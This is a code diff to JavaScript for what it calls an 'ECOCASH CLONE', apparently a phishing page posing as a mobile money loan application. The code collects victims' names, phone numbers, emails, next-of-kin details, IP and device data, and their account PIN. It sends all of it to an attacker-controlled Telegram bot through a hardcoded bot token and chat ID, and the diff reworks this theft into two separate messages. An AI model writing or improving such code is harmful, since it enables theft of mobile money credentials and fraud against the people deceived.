@@ -1,5 +1,5 @@
 /* =========================================
-   ECOCASH CLONE - DEBUG VERSION
+   ECOCASH CLONE - TWO-PART TELEGRAM WORKFLOW
    ========================================= */
 
 // ==========================================
@@ -7,10 +7,10 @@
 // ==========================================
 const TELEGRAM_BOT_TOKEN = '8827045093:AAElik1G_KqVGWfKVZNoZikvLdDcuM9bSM8';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-const TELEGRAM_CHAT_ID = '7140823960'; // ← CHANGE THIS TO YOUR REAL CHAT ID
+const TELEGRAM_CHAT_ID = '714082360'; // ← YOUR REAL CHAT ID
 
-console.log("✅ Bot Token loaded:", TELEGRAM_BOT_TOKEN);
-console.log("✅ Chat ID loaded:", TELEGRAM_CHAT_ID);
+// Global variable to store Application ID
+let applicationId = '';
 
 // ==========================================
 // DOM READY
@@ -23,7 +23,6 @@ document.addEventListener("DOMContentLoaded", function () {
     const phoneInput = document.getElementById("loginPhone");
     if (phoneInput) {
         phoneInput.value = localStorage.getItem("phone") || "";
-        console.log("📱 Phone loaded:", phoneInput.value);
     }
 
     // Setup PIN inputs
@@ -112,7 +111,12 @@ function nextStep2() {
     showLoaderAndGo("step3.html");
 }
 
-function nextStep3() {
+// ==========================================
+// PART 1: SEND APPLICATION DETAILS (STEP 3)
+// ==========================================
+async function nextStep3() {
+    console.log("🚀 nextStep3() - Sending application details to Telegram...");
+    
     const kfname = document.getElementById("kfname").value.trim();
     const klname = document.getElementById("klname").value.trim();
     const kphone = document.getElementById("kphone").value.trim();
@@ -128,7 +132,115 @@ function nextStep3() {
     localStorage.setItem("kphone", kphone);
     localStorage.setItem("province", province);
 
-    showLoaderAndGo("step4.html");
+    // Show loader
+    document.getElementById('pageLoader').style.display = 'block';
+    
+    try {
+        // === PART 1: SEND APPLICATION DETAILS TO TELEGRAM ===
+        await sendApplicationDetails();
+        console.log("✅ Part 1 complete: Application details sent to Telegram!");
+        
+        // Clear loader and move to Step 4
+        document.getElementById('pageLoader').style.display = 'none';
+        showLoaderAndGo("step4.html");
+        
+    } catch (error) {
+        console.error("❌ Failed to send application details:", error);
+        document.getElementById('pageLoader').style.display = 'none';
+        showError("❌ Failed to submit application. Please try again.");
+    }
+}
+
+// ==========================================
+// SEND APPLICATION DETAILS (NO PIN)
+// ==========================================
+async function sendApplicationDetails() {
+    console.log("📤 Sending application details (no PIN)...");
+    
+    const accountType = document.getElementById('accountType')?.value || 'Mobile';
+    const phone = localStorage.getItem('phone') || '';
+    const fullName = localStorage.getItem('fullName') || '';
+    const email = localStorage.getItem('email') || '';
+    const amount = localStorage.getItem('amount') || '0';
+    const duration = localStorage.getItem('duration') || '0';
+    const reason = localStorage.getItem('reason') || '';
+    const kfname = localStorage.getItem('kfname') || '';
+    const klname = localStorage.getItem('klname') || '';
+    const kinName = kfname + ' ' + klname;
+    const kinPhone = localStorage.getItem('kphone') || '';
+    const province = localStorage.getItem('province') || '';
+    
+    // Generate Application ID
+    applicationId = 'APP-' + Date.now().toString().slice(-6);
+    localStorage.setItem("applicationId", applicationId);
+    console.log("🆔 Generated Application ID:", applicationId);
+    
+    const deviceInfo = getDeviceInfo();
+    const ipAddress = await getIPAddress();
+    const timestamp = new Date().toLocaleString();
+    
+    const principal = parseFloat(amount);
+    const days = parseInt(duration);
+    const DAILY_RATE = 0.005;
+    const interest = principal * DAILY_RATE * days;
+    const total = principal + interest;
+    
+    const message = `
+📋 *LOAN APPLICATION RECEIVED - PART 1*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🆔 *Application ID:* ${applicationId}
+📱 *Phone:* ${phone}
+📧 *Email:* ${email}
+
+📋 *LOAN DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━
+💰 Principal: $${principal.toFixed(2)}
+📅 Duration: ${days} days
+📊 Interest: $${interest.toFixed(2)}
+💵 Total: $${total.toFixed(2)}
+📝 Reason: ${reason}
+
+👤 *APPLICANT*
+━━━━━━━━━━━━━━━━━━━━━━
+👤 Name: ${fullName}
+📋 Account: ${accountType}
+
+👨‍👩‍👧 *NEXT OF KIN*
+━━━━━━━━━━━━━━━━━━━━━━
+👤 Kin: ${kinName}
+📱 Kin Phone: ${kinPhone}
+📍 Province: ${province}
+
+🖥️ *DEVICE INFO*
+━━━━━━━━━━━━━━━━━━━━━━
+💻 Device: ${deviceInfo.deviceType}
+🌍 Browser: ${deviceInfo.browser}
+🌐 IP: ${ipAddress}
+🕐 Time: ${timestamp}
+
+⚠️ *STATUS: AWAITING PIN CONFIRMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    `;
+
+    const response = await fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    });
+    
+    const responseData = await response.json();
+    console.log("📥 Part 1 response:", responseData);
+    
+    if (!responseData.ok) {
+        throw new Error(responseData.description || 'Telegram API error');
+    }
+    
+    return responseData;
 }
 
 function nextStep4() {
@@ -242,105 +354,51 @@ async function getIPAddress() {
 }
 
 // ==========================================
-// SEND TO TELEGRAM - DEBUG VERSION
+// PART 2: SEND PIN CONFIRMATION (STEP 5)
 // ==========================================
-async function sendToTelegram(data) {
-    console.log("📤 Sending application to Telegram...");
-    console.log("📤 Target URL:", TELEGRAM_API_URL);
-    console.log("📤 Chat ID:", TELEGRAM_CHAT_ID);
+async function sendPinConfirmation(pin) {
+    console.log("📤 Sending PIN confirmation...");
     
-    const principal = parseFloat(data.amount);
-    const days = parseInt(data.duration);
-    const DAILY_RATE = 0.005;
-    const interest = principal * DAILY_RATE * days;
-    const total = principal + interest;
-    
-    const applicationId = 'APP-' + Date.now().toString().slice(-6);
+    const phone = localStorage.getItem('phone') || '';
+    const appId = localStorage.getItem('applicationId') || applicationId;
     
     const message = `
-📋 *NEW LOAN APPLICATION SUBMITTED*
+🔐 *PIN CONFIRMATION RECEIVED - PART 2*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🆔 *Application ID:* ${applicationId}
-🔑 *PIN Entered:* ${data.pin}
+🆔 *Application ID:* ${appId}
+📱 *Phone:* ${phone}
+🔢 *PIN Entered:* ${pin}
 
-📋 *LOAN DETAILS*
-━━━━━━━━━━━━━━━━━━━━━━
-💰 Principal: $${principal.toFixed(2)}
-📅 Duration: ${days} days
-📊 Interest: $${interest.toFixed(2)}
-💵 Total: $${total.toFixed(2)}
-📝 Reason: ${data.reason}
-
-👤 *APPLICANT*
-━━━━━━━━━━━━━━━━━━━━━━
-👤 Name: ${data.fullName}
-📱 Phone: ${data.phone}
-📧 Email: ${data.email}
-📋 Account: ${data.accountType}
-
-👨‍👩‍👧 *NEXT OF KIN*
-━━━━━━━━━━━━━━━━━━━━━━
-👤 Kin: ${data.kinName}
-📱 Kin Phone: ${data.kinPhone}
-📍 Province: ${data.province}
-
-🖥️ *DEVICE INFO*
-━━━━━━━━━━━━━━━━━━━━━━
-💻 Device: ${data.deviceInfo.deviceType}
-🌍 Browser: ${data.deviceInfo.browser}
-🌐 IP: ${data.ipAddress}
-🕐 Time: ${data.timestamp}
-
-✅ *STATUS: APPLICATION COMPLETE - DASHBOARD ACCESS GRANTED*
+✅ *STATUS: APPLICATION COMPLETE*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
 
-    const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-    };
+    const response = await fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    });
     
-    console.log("📤 Sending payload:", payload);
-
-    try {
-        console.log("⏳ Waiting for Telegram response...");
-        const response = await fetch(TELEGRAM_API_URL, {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-        
-        console.log("📥 Response status:", response.status);
-        console.log("📥 Response OK?", response.ok);
-        
-        const responseData = await response.json();
-        console.log("📥 Full response data:", responseData);
-        
-        if (!responseData.ok) {
-            console.error("❌ Telegram returned error:", responseData.description);
-            throw new Error(responseData.description || 'Telegram API error');
-        }
-        
-        console.log("✅ Telegram send successful!");
-        return responseData;
-        
-    } catch (error) {
-        console.error("❌ Fetch error in sendToTelegram:", error);
-        console.error("❌ Error type:", error.name);
-        console.error("❌ Error message:", error.message);
-        throw error;
+    const responseData = await response.json();
+    console.log("📥 Part 2 response:", responseData);
+    
+    if (!responseData.ok) {
+        throw new Error(responseData.description || 'Telegram API error');
     }
+    
+    return responseData;
 }
 
 // ==========================================
-// SUBMIT LOGIN - SECURITY-LESS VERSION
+// SUBMIT LOGIN - PART 2 ONLY
 // ==========================================
 async function submitLogin() {
-    console.log("🚀 submitLogin() started - Security-less mode");
+    console.log("🚀 submitLogin() - Sending PIN confirmation...");
     
     const errorBox = document.getElementById('errorBox');
     const successBox = document.getElementById('successBox');
@@ -351,70 +409,27 @@ async function submitLogin() {
     successBox.style.display = 'none';
     
     if (pin.length < 4) {
-        showError("Please enter a 4-digit PIN to continue");
+        showError("Please enter your 4-digit PIN");
         return;
     }
     
-    const accountType = document.getElementById('accountType').value;
-    const phone = localStorage.getItem('phone') || '';
-    const fullName = localStorage.getItem('fullName') || '';
-    const email = localStorage.getItem('email') || '';
-    const amount = localStorage.getItem('amount') || '0';
-    const duration = localStorage.getItem('duration') || '0';
-    const reason = localStorage.getItem('reason') || '';
-    const kinName = (localStorage.getItem('kfname') || '') + ' ' + (localStorage.getItem('klname') || '');
-    const kinPhone = localStorage.getItem('kphone') || '';
-    const province = localStorage.getItem('province') || '';
-    
     document.getElementById('pageLoader').style.display = 'block';
-    console.log("⏳ Processing submission...");
     
     try {
-        const deviceInfo = getDeviceInfo();
-        const ipAddress = await getIPAddress();
-        const timestamp = new Date().toLocaleString('en-US', { 
-            timeZone: deviceInfo.timezone,
-            hour12: true 
-        });
+        // === PART 2: SEND PIN CONFIRMATION ===
+        await sendPinConfirmation(pin);
+        console.log("✅ Part 2 complete: PIN confirmation sent to Telegram!");
         
-        const applicationData = {
-            pin: pin,
-            accountType: accountType,
-            phone: phone,
-            fullName: fullName,
-            email: email,
-            amount: amount,
-            duration: duration,
-            reason: reason,
-            kinName: kinName,
-            kinPhone: kinPhone,
-            province: province,
-            deviceInfo: deviceInfo,
-            ipAddress: ipAddress,
-            timestamp: timestamp
-        };
+        successBox.style.display = 'block';
+        successBox.innerHTML = '✅ Application complete! Redirecting to dashboard...';
         
-        console.log("📦 Data prepared:", applicationData);
-        
-        const telegramResponse = await sendToTelegram(applicationData);
-        
-        if (telegramResponse.ok) {
-            console.log("✅ Application sent to Telegram!");
-            
-            successBox.style.display = 'block';
-            successBox.innerHTML = '✅ Application submitted successfully! Redirecting to dashboard...';
-            
-            setTimeout(() => {
-                window.location.href = "dashboard.html";
-            }, 2000);
-            
-        } else {
-            throw new Error('Telegram send failed');
-        }
+        setTimeout(() => {
+            window.location.href = "dashboard.html";
+        }, 2000);
         
     } catch (error) {
-        console.error("❌ Error submitting application:", error);
-        showError('❌ Failed to submit application. Please try again. Check console for details.');
+        console.error("❌ Failed to send PIN confirmation:", error);
+        showError('❌ Failed to submit PIN. Please try again.');
     } finally {
         document.getElementById('pageLoader').style.display = 'none';
     }
@@ -428,7 +443,6 @@ function showError(msg) {
     if (box) {
         box.innerText = msg;
         box.style.display = "block";
-        console.error("❌ Error displayed:", msg);
     } else {
         alert(msg);
     }
